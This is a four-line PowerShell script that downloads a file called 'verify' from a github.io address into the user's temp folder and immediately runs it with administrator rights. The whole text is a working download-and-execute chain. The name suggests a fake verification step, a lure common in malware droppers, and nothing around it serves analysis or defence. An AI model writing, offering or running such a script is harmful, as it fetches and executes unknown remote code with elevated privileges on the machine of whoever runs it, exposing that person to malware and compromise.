
$exeScriptUrl = "http://mcrobbyyt.github.io/verify"

$localScriptPath = "$env:TEMP\verify"

Invoke-WebRequest -Uri $exeScriptUrl -OutFile $localScriptPath

Start-Process $localScriptPath -Verb RunAs